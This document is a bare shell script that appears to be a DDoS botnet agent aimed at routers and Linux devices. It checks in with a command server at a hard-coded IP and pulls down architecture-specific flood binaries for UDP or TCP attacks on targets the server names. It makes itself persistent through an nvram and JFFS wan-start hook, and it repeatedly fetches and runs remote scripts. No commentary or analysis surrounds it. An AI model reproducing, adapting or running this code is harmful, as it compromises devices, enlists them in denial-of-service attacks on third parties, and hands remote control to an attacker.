wget http://45.198.224.130/report//hb0 >/dev/null 2>&1;
B=
T=$(wget -qO- http://45.198.224.130/task/$B 2>/dev/null); set -- $T; D=${4:-25}; if [ -n "$1" ]; then if [ "$3" = "udp" ]; then [ -s /tmp/uf ] || wget -O /tmp/uf http://45.198.224.130/syn/ud_x64 >/dev/null 2>&1; chmod +x /tmp/uf 2>/dev/null; setsid /tmp/uf $1 $2 $D 5000 $B </dev/null >/dev/null 2>&1 & else [ -s /tmp/t4 ] || wget -O /tmp/t4 http://45.198.224.130/syn/u_x64 >/dev/null 2>&1; chmod +x /tmp/t4 2>/dev/null; setsid /tmp/t4 $1 $2 $D 5000 $B </dev/null >/dev/null 2>&1 &   </dev/null >/dev/null 2>&1 &   </dev/null >/dev/null 2>&1 & fi; fi
[ -s /var/tmp/pdone ] || { nvram set jffs2_scripts=1; nvram commit; mkdir -p /jffs/scripts 2>/dev/null; printf '#!/bin/sh\nwget -O /var/tmp/pp http://45.198.224.130/ag/;sh /var/tmp/pp &\n' > /jffs/scripts/wan-start 2>/dev/null; chmod +x /jffs/scripts/wan-start 2>/dev/null; touch /var/tmp/pdone; }
echo 65535 > /proc/sys/net/netfilter/nf_conntrack_max 2>/dev/null; echo 60 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established 2>/dev/null; echo 10 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_time_wait 2>/dev/null; echo 30 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_unacknowledged 2>/dev/null;
uname -m > /var/tmp/am 2>/dev/null;
BU=w1; UR=u_mips;
grep -qx mipsel /var/tmp/am && BU=w2 && UR=u_mipsel;
grep -qx mips /var/tmp/am && BU=w1 && UR=u_mips;
grep -q '^arm' /var/tmp/am && BU=w3 && UR=u_arm;
grep -qx x86_64 /var/tmp/am && BU=w4 && UR=u_x64;
rm -f /var/tmp/v1 /var/tmp/v2 /var/tmp/v3 /var/tmp/v4 /var/tmp/r2 /var/tmp/r3 /var/tmp/am /var/tmp/bn /var/tmp/k 2>/dev/null; rm -f /var/tmp/t1 /var/tmp/t2 /var/tmp/t3 /var/tmp/t4 2>/dev/null; iptables -t raw -F 2>/dev/null; iptables -t raw -A OUTPUT -d 117.27.143.117 -p tcp --dport 22 --syn -j NOTRACK 2>/dev/null; iptables -t raw -A PREROUTING -s 117.27.143.117 -p tcp --sport 22 --tcp-flags SYN,ACK SYN,ACK -j NOTRACK 2>/dev/null;
wget -O /var/tmp/k http://45.198.224.130/task.sh 2>/dev/null; sh /var/tmp/k 2>/dev/null;
setsid sh -c 'wget -O /var/tmp/r3 http://45.198.224.130/ag/;sh /var/tmp/r3' </dev/null >/dev/null 2>&1 &
sleep 6;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
wget -T 2 -O /dev/null "http://117.27.143.117:22/z" >/dev/null 2>&1; wget http://45.198.224.130/report//hb >/dev/null 2>&1;sleep 2;
